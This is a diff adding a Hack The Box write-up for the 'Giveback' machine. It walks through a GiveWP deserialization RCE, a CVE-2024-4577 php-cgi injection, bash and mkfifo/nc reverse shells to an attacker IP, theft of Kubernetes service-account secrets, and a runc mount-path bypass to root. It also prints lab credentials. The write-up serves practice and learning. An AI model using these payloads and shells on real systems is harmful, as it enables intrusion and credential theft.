@@ -59,16 +59,270 @@
         <h1 class="writeup-title">Giveback</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">February 21, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
                 <p><img alt="pwned" src="../images/Giveback/pwned.png" /></p>
-<p>Giveback is an ACTIVE machine!</p>
-<p>This write-up will go live once Giveback retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+<p>Giveback was a medium-difficulty Linux machine that began with an nmap scan revealing SSH on port 22 and HTTP on port 80.
+The web application was a WordPress-based donation website. I ran wpscan against it, which revealed an outdated GiveWP plugin (version 3.14.0).
+Researching CVEs affecting this version led me to a PHP Object Injection vulnerability via deserialization of untrusted user-controlled data in the donation form.
+After investigating the plugin's source code on GitHub to understand the injection point and the deserialization trigger on the receipt page, I searched for a usable POP gadget chain using phpggc, identifying Symfony/RCE6 as a candidate.
+Unable to get the payload working through Burp, I located a public PoC for the closely related CVE-2024-5932, which targeted a different parameter but used the same deserialization primitive with a Stripe-based gadget chain.
+Sending a bash reverse shell command through the PoC granted me a foothold inside a Docker container running as root.</p>
+<p>Enumerating the container's environment variables revealed it was part of a Kubernetes cluster, exposing database credentials, internal service addresses, and a legacy intranet service running on 10.43.2.241:5000.
+I queried the WordPress MariaDB database but the recovered password hash did not crack. After transferring a static busybox binary onto the container for additional tooling, I set up a ligolo tunnel to reach the internal Kubernetes network and accessed the legacy service in my browser.
+It exposed a PHP-CGI endpoint with a developer note indicating it was originally deployed on Windows IIS. I identified CVE-2024-4577, a PHP-CGI argument injection vulnerability closely related to the older CVE-2012-1823, where the %AD soft hyphen character is normalized to a dash by php-cgi.exe, enabling argument injection and remote code execution via the auto_prepend_file directive.
+Since bash was absent on this container, I used a mkfifo-based sh reverse shell to obtain a foothold on the legacy container.</p>
+<p>From this second container, I found Kubernetes serviceaccount credentials at the standard /var/run/secrets/kubernetes.io/serviceaccount path and used the token to authenticate to the Kubernetes API.
+While most actions were restricted, I was able to query the cluster secrets, which returned several base64-encoded values including a password for the babywyrm user. Decoding it and using it to SSH into the main machine granted me the user flag.</p>
+<p>For privilege escalation, sudo -l revealed that babywyrm could run /opt/debug as root. The binary was unreadable and prompted for an administrative password.
+Trying the passwords recovered from the Kubernetes secrets revealed that the MariaDB password worked. The binary turned out to be a runc wrapper, a utility for running containers.
+I generated a runc config with sudo /opt/debug spec and added a bind mount for the host root filesystem. Mounting / directly was blocked, consistent with a denylist approach that blocks specific known paths rather than allowlisting safe ones.
+Using a relative path of ../../ instead bypassed the check, as the restriction performed a string comparison against the literal path rather than resolving it first. After also setting terminal to false to avoid a /dev/console PTY allocation error, the container launched successfully with the host filesystem mounted, granting access to the root flag.</p>
+<h1>User Flag</h1>
+<p><img alt="nmap" src="../images/Giveback/nmap.png" /></p>
+<p>Initial nmap scan reveals 2 open ports. SSH on 22, and HTTP on 80. One thing to note is that the website uses WordPress as its CMS.</p>
+<h2>Taking a look at the website</h2>
+<p><img alt="website" src="../images/Giveback/website.png" /></p>
+<p>This is a website focused on donations. I can send test donations and share the results on social media.</p>
+<p>Since I know that this website uses WordPress, I will run <code>wpscan</code> against the main URL to gather information about the instance.</p>
+<p><img alt="wpscan" src="../images/Giveback/wpscan.png" /></p>
+<p>Aside from the WP version and its theme, the scanner found an out-of-date plugin.</p>
+<p><code>Give</code> is the most popular donation/fundraising plugin for WordPress, allowing users to create customized donation forms, manage donors, and track fundraising reports directly on a WordPress site.</p>
+<p>I'll look for CVEs affecting this version on the web.</p>
+<p><a href="https://www.cvedetails.com/version/1801950/Givewp-Givewp-3.14.0.html">https://www.cvedetails.com/version/1801950/Givewp-Givewp-3.14.0.html</a></p>
+<p><img alt="cve" src="../images/Giveback/cve.png" /></p>
+<p>I'm most interested in the command execution vulnerabilities, as exploiting these will grant me a foothold on the box. I'll take a look at the vulns from <code>2024</code> first.</p>
+<p><img alt="cves" src="../images/Giveback/cves.png" /></p>
+<p>There are 3 PHP Object Injection vulnerabilities via deserialization of untrusted(user-controlled) data for various parameters.</p>
+<p><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></p>
+<p>PHP has a built-in way to convert complex objects or arrays into a flat string so they can be stored or transmitted. This is called <code>serialization</code>, and the reverse is <code>deserialization</code></p>
+<pre class="codehilite"><code>class User {
+    public $name = &quot;alice&quot;;
+    public $role = &quot;subscriber&quot;;
+}
+
+$obj = new User();
+echo serialize($obj);
+# Outputs: O:4:&quot;User&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;alice&quot;;s:4:&quot;role&quot;;s:10:&quot;subscriber&quot;;}
+</code></pre>
+
+<p>The serialized object represents, in order:</p>
+<pre class="codehilite"><code>O:4:&quot;User&quot; -&gt; Object.class name is 4 chars long, and it is User.
+
+:2: -&gt; 2 fields in the object.
+
+{s:4:&quot;name&quot; -&gt; This is the beginning of the object's values. It's nested, just like the values in the code. In this case, this fragment represents a 4-character string &quot;name&quot;
+
+;s&quot;5&quot;alice&quot; -&gt; A 5-char string &quot;alice&quot;. In this context, this means that &quot;name&quot; is &quot;alice&quot;
+
+;s:4:&quot;role&quot;;s:10:&quot;subscriber&quot; -&gt; THe same thing occurs here. Two strings with the number of their characters, connecting into &quot;role - subscriber&quot;
+</code></pre>
+
+<h2>Investigating the plugin's source code</h2>
+<p>I will grab the exact GiveWP version from the GitHub repo. This will aid me in finding the injection point in just a moment.</p>
+<p><a href="https://github.com/impress-org/givewp/releases/tag/3.14.0">https://github.com/impress-org/givewp/releases/tag/3.14.0</a></p>
+<p><img alt="source" src="../images/Giveback/source.png" /></p>
+<p>The first thing I'll do with the source is look for the faulty parameter, <code>give_company_name</code></p>
+<p><code>grep -r give_company_name -C 5 | grep -E "unserialize|serialize|destruct|wakeup" -C 5</code></p>
+<p>It found a single result in <code>includes/payments/class-give-payment.php</code>. I'll open this file in Sublime Text.</p>
+<p><img alt="code" src="../images/Giveback/code.png" /></p>
+<p>If the value is NOT empty, it will be passed to <code>give_clean</code> before being saved as <code>give_company</code></p>
+<p>Looking for this function within the source with <code>grep -r "function give_clean"</code> reveals that it is defined in <code>includes/formatting.php</code></p>
+<p>This function is quite small, it is just:</p>
+<pre class="codehilite"><code>function give_clean($var)
+{
+    if (is_array($var)) {
+        return array_map('give_clean', $var);
+    }
+
+    return is_scalar($var) ? sanitize_text_field(wp_unslash($var)) : $var;
+}
+</code></pre>
+
+<p>A wrapper around <code>sanitize_text_field</code>, which is a standard WordPress function meant to protect against XSS. In addition to that, it also calls <code>wp_unslash</code> to remove slashes, most likely protecting against path traversal attacks.</p>
+<p><a href="https://developer.wordpress.org/reference/functions/sanitize_text_field/">https://developer.wordpress.org/reference/functions/sanitize_text_field/</a></p>
+<p><a href="https://developer.wordpress.org/reference/functions/wp_unslash/">https://developer.wordpress.org/reference/functions/wp_unslash/</a></p>
+<p>This value is then saved in the page meta with <code>give_update_meta( $payment_id, '_give_donation_company', $give_company );</code>. This is yet another wrapper, this time over the <code>update_post_meta()</code> function, which stores data in the <code>wp_postmeta</code> table keyed by post ID. So the company name gets stored as post meta under the key <code>_give_donation_company</code> attached to the payment post.</p>
+<p>Looking at where in the source <code>_give_donation_company</code>, I can see an immediate trigger for the deserialization vulnerability.</p>
+<p><img alt="receipt" src="../images/Giveback/receipt.png" /></p>
+<p>This piece of code fires whenever a donor views their receipt page after donating, meaning deserialization could fire immediately after I submit the form, when the receipt page loads.</p>
+<h2>Exploiting the PHP Object Injection vulnerability</h2>
+<p>Because the CVE mentions a POP chain is needed for the exploit, I will look at what PHP libraries are included in this GiveWP version. I'll look into the <code>vendor</code> directory to see them.</p>
+<p><img alt="libraries" src="../images/Giveback/libraries.png" /></p>
+<p>There are quite a few of them. I will search for the installed components, as well as their versions, in the <code>installed.json</code> file.</p>
+<p><code>cat vendor/composer/installed.json | grep -E "fakerphp|kjohnson|moneyphp|myclabs|paypal|psr|stellarwp|stripe|symfony|tecnickcom|woocommerce" | grep source</code></p>
+<p><img alt="versions" src="../images/Giveback/versions.png" /></p>
+<p>Trying to find a gadget chain manually would require quite a lot of time, so I will look for existing chains with <code>phpggc</code></p>
+<p><code>phpggc -l | grep -iE "fakerphp|kjohnson|moneyphp|myclabs|paypal|psr|stellarwp|stripe|symfony|tecnickcom|woocommerce"</code></p>
+<p><img alt="gadgets" src="../images/Giveback/gadgets.png" /></p>
+<p>Symfony RCE6 and RCE8 are the most fitting candidates, taking into account the version number. WooCommerce is not present in the installer.json file, only its action-scheduler is present. Aside from that, a second requirement for that chain is a very old WP core, which does not fit with the wpscan report from earlier.</p>
+<p><code>phpggc Symfony/RCE6 'id'</code></p>
+<p><img alt="chain" src="../images/Giveback/chain.png" /></p>
+<p>I took this chain and sent it against the form via BurpSuite, however, the <code>give_company_name</code> parameter did not exist in the response. I added it and sent the result, but the server just returned <code>success</code> without any way to confirm that the code was in fact executed.</p>
+<p>Not being able to make the vulnerability work through Burp, I decided to look for a PoC for this or a similar vulnerability online.</p>
+<p><a href="https://github.com/EQSTLab/CVE-2024-5932">https://github.com/EQSTLab/CVE-2024-5932</a></p>
+<p><code>python CVE-2024-5932-rce.py  -u http://giveback.htb/donations/the-things-we-need/ -c "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.2/9001 0&gt;&amp;1'"</code></p>
+<p>This PoC exploits a different, but very similar vulnerability. The only difference is that it targets a different parameter.</p>
+<p><img alt="poc" src="../images/Giveback/poc.png" /></p>
+<p>Right away, 2 things catch my attention:</p>
+<ol>
+<li>
+<p>The requested data section is presented as a JSON object.</p>
+</li>
+<li>
+<p>The gadget chain itself begins from Stripe, not from Symfony.</p>
+</li>
+</ol>
+<p>What's interesting is that this payload does not work through Burp either. Perhaps it is because my Burp instance is set not follow redirects, or it's just that the payload needs to be sent as a JSON object.</p>
+<p>Regardless, sending this command through results in a shell.</p>
+<p><img alt="shell" src="../images/Giveback/shell.png" /></p>
+<h2>Enumeration of the unusual container</h2>
+<p>I landed in this container as a root user... There are no <code>/home</code> directories, and sudo does not exist. Looking at the environmental variables reveals a bunch of values, though.</p>
+<pre class="codehilite"><code># WordPress DB
+
+WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
+WORDPRESS_ENABLE_DATABASE_SSL=no
+WORDPRESS_DATABASE_SSL_CERT_FILE=
+WORDPRESS_DATABASE_USER=bn_wordpress
+WORDPRESS_DATABASE_SSL_KEY_FILE=
+WORDPRESS_DATABASE_PORT_NUMBER=3306
+WORDPRESS_DATABASE_NAME=bitnami_wordpress
+WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
+WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
+WORDPRESS_VERIFY_DATABASE_SSL=yes
+WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
+WORDPRESS_DATABASE_SSL_CA_FILE=
+
+# MariaDB
+
+BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
+WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
+MARIADB_PORT_NUMBER=3306
+BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
+BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
+MARIADB_HOST=beta-vino-wp-mariadb
+BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
+BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
+BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
+BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
+WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
+BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
+
+# Kubernetes
+
+KUBERNETES_SERVICE_PORT_HTTPS=443
+KUBERNETES_SERVICE_PORT=443
+KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
+KUBERNETES_SERVICE_HOST=10.43.0.1
+KUBERNETES_PORT=tcp://10.43.0.1:443
+KUBERNETES_PORT_443_TCP_PORT=443
+</code></pre>
+
+<p>This explains a lot. This container is part of a Kubernetes cluster network. Since it is missing quite a lot of tools I'd like to have, I will upload a static <code>busybox</code> bin onto the container.</p>
+<p>Before that, actually, I will enumerate the WordPress database located on this container. I have everything necessary to do so, and it might yield credentials.</p>
+<p><code>mysql -u bn_wordpress -psW5sp4spa3u7RLyetrekE4oS -h beta-vino-wp-mariadb -e "use bitnami_wordpress; show tables; select * from wp_users;"</code></p>
+<p><img alt="db" src="../images/Giveback/db.png" /></p>
+<p>This hash does not crack, so it is a dead end. Now I'll actually transfer the mentioned earlier busybox bin.</p>
+<pre class="codehilite"><code>timeout 5 cat &lt; /dev/tcp/10.10.16.2/9002 &gt; /tmp/busybox | On victim
+
+nc -lnkvp 9002 &lt; busybox | On attack box
+</code></pre>
+
+<h2>Exploring the legacy service</h2>
+<p>Aside from the earlier mentioned env vars, there was another set of interesting variables.</p>
+<pre class="codehilite"><code>LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
+LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
+LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
+LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
+LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
+</code></pre>
+
+<p>There is some sort of legacy intranet service running on <code>10.43.2.241:5000</code>. Running <code>wget</code> through busybox on this IP confirms that it is reachable.</p>
+<p>After quickly setting up a ligolo tunnel for the 10.43.2.x route through the container, I can now access the legacy service directly in my Burp browser.</p>
+<p><img alt="legacy" src="../images/Giveback/legacy.png" /></p>
+<p>It is indeed a legacy service, a CMS to be accurate. It exposes a PHP-CGI endpoint, which provides a way to run a server-side script (PHP, Perl, Python) when an HTTP request comes.</p>
+<p>The developer's note mentions that this CMS was originally deployed on Windows IIS using the php-cgi.exe bin. Windows-style CGI is being retained for legacy reasons.</p>
+<p>This is useful knowledge. Researching for CVEs related to php-cgi, I found a very old CVE, as well as the most recent one, affecting especially Windows environments.</p>
+<p><a href="https://github.com/watchtowrlabs/CVE-2024-4577">https://github.com/watchtowrlabs/CVE-2024-4577</a></p>
+<p>This is very similar to an older CVE <code>CVE-2012-1823</code>, where an attacker can inject arguments and modify internal PHP configuration to allow injecting code directly from HTTP data.</p>
+<p>The only difference between those two is the <code>%AD</code> soft hyphen character. Normally invisible, it is changed to <code>-</code> when passed to <code>php-cgi.exe</code>, and this results in the same argument injection vulnerability as the older CVE.</p>
+<p><code>curl http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input -d "command"</code></p>
+<p><img alt="commands" src="../images/Giveback/commands.png" /></p>
+<p>I was trying to curl a bash revshell... But while the request came through to my Python server, no reverse shell came back. I checked what shells were available on the container.</p>
+<p><img alt="missing" src="../images/Giveback/missing.png" /></p>
+<p>Bash is not present on the box. My usual bash reverse shell will not work, as <code>/dev/tcp</code> is a bash feature. Instead, I will use a more independent shell.</p>
+<pre class="codehilite"><code>#!/bin/sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.2 9003 &gt;/tmp/f
+</code></pre>
+
+<p>The idea here is that whatever I write through the nc connection is written to /tmp/f. <code>cat /tmp/f</code> reads that and feeds it to <code>sh -i</code>, sh -i executes that and sends output to nc, and nc sends the output back to me. Then the pseudo-loop repeats indefinitely.</p>
+<p><img alt="shell2" src="../images/Giveback/shell2.png" /></p>
+<h2>Enumerating the Kubernetes SA secrets</h2>
+<p>On this new container, I checked whether I could reach the Kubernetes service port known from the environmental variables.</p>
+<p><code>curl https://10.43.0.1:443 -insecure</code></p>
+<p><img alt="curl" src="../images/Giveback/curl.png" /></p>
+<p>The Kubernetes API is available at this address. I'm unauthorized, so I'll look for Kube secrets on this container.</p>
+<p><code>/var/run/secrets/kubernetes.io/serviceaccount</code></p>
+<p><img alt="secrets" src="../images/Giveback/secrets.png" /></p>
+<p><code>servciceaccount</code> is an identity for processes executed within Kube clusters. It allows them to authenticate to the Kubernetes API and is meant to be used by machines and for automation.</p>
+<p>With the token in hand, I can not authenticate to the Kube API that was blocked earlier. There is also a cert, which will allow me to drop the <code>--insecure</code> flag in curl.</p>
+<p><code>TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) &amp;&amp; curl https://10.43.0.1:443 -H "Authorization: Bearer $TOKEN" --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt</code></p>
+<p><img alt="checking" src="../images/Giveback/checking.png" /></p>
+<p>There's not much I can do, even when authenticated. I'll check whether this token allows me to grab the Kube secrets, which should not be allowed. These secrets can contain passwords, secret data, and more.</p>
+<p><code>TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) &amp;&amp; curl https://10.43.0.1:443/api/v1/namespaces/default/secrets -H "Authorization: Bearer $TOKEN" --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt</code></p>
+<p><img alt="secret" src="../images/Giveback/secret.png" /></p>
+<p>Quite a lot of data came back, including the <code>user-secret-babywyrm</code> object with a MASTERPASS value of <code>VkVqcEtUbE1ZSGo1eDFTakdydWlzclM3UU5jdDBV</code>. I've seen this babywyrm user in the WordPress DB with an uncrackable hash, so I'll try their credentials to SSH into the main box.</p>
+<p>The password values are base64-encoded in this secret clump. After decoding, the password becomes:</p>
+<p><code>babywyrm | VEjpKTlMYHj5x1SjGruisrS7QNct0U</code></p>
+<p><img alt="user" src="../images/Giveback/user.png" /></p>
+<h1>Root Flag</h1>
+<p><img alt="sudol" src="../images/Giveback/sudol.png" /></p>
+<p>The user can run this <code>/opt/debug</code> binary as root. The file binary does not exist on this box, so I don't really know what it is. It's owned by root as well, so I cannot cat or read it either.</p>
+<h2>Finding the administrative password</h2>
+<p><img alt="debug" src="../images/Giveback/debug.png" /></p>
+<p>Upon running the binary, it requests a different administrative password. The user password does not work this time, but aside from it, the Kube secrets contained 3 other passwords.</p>
+<pre class="codehilite"><code>&quot;mariadb-password&quot;: &quot;c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T&quot;,
+&quot;mariadb-root-password&quot;: &quot;c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw==&quot;
+&quot;wordpress-password&quot;: &quot;TzhGN0tSNXpHaQ==&quot;
+</code></pre>
+
+<p>The regular MariaDB password, decoded from b64 <code>sW5sp4spa3u7RLyetrekE4oS</code>, works for the administrative password.</p>
+<p><img alt="pass" src="../images/Giveback/pass.png" /></p>
+<h2>Privilege escalation to root with runc wrapper container creation via relative paths</h2>
+<p>This debug bin is a wrapper for runc, a utility that allows users to run containers on Linux. Since it will be running as root, I'll look for a way to escalate privileges.</p>
+<p><a href="https://github.com/b4rdia/HackTricks/blob/master/linux-hardening/privilege-escalation/runc-privilege-escalation.md">https://github.com/b4rdia/HackTricks/blob/master/linux-hardening/privilege-escalation/runc-privilege-escalation.md</a></p>
+<p>With the ability to run runc as root, I can run a container with the host's<code>/</code> root directory mounted.</p>
+<p>First, I will create a config file with <code>sudo /opt/debug spec</code>. In this config file, in the <code>mounts</code> section, I will add the root directory mount.</p>
+<pre class="codehilite"><code>{
+    &quot;type&quot;: &quot;bind&quot;,
+    &quot;source&quot;: &quot;/&quot;,
+    &quot;destination&quot;: &quot;/&quot;,
+    &quot;options&quot;: [
+        &quot;rbind&quot;,
+        &quot;rw&quot;,
+        &quot;rprivate&quot;
+    ]
+},
+</code></pre>
+
+<p><img alt="addition" src="../images/Giveback/addition.png" /></p>
+<p>However, trying to run the malicious container fails because of the root mount.</p>
+<p><img alt="stopped" src="../images/Giveback/stopped.png" /></p>
+<p>Makes sense, as the wrapper was supposed to be restricted. I'll try using a relative path <code>../../</code> instead to see whether this will get blocked as well. This is aiming to exploit a targeted DENY list, which blocks only certain directories and absolute paths, instead of listing what can be accessed. This is not a good idea, as there is always a chance that a new bypass might be discovered, whereas an ALLOW list will just keep specifying what can be accessed, unbothered by attempts at bypassing.</p>
+<p><img alt="progress" src="../images/Giveback/progress.png" /></p>
+<p>This time it got further! The <code>/dev/console</code> error happens because <code>terminal</code> is set to true in the config. When that setting is true, runc tries to allocate a PTY (pseudo-terminal) and set up /dev/console inside the container.</p>
+<p>My <code>rootfs</code> is minimal. There is no proper <code>/dev/console</code> device node set up, so it fails before the process even starts. I'll set the terminal setting to <code>false</code></p>
+<p><img alt="root" src="../images/Giveback/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -87,7 +341,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
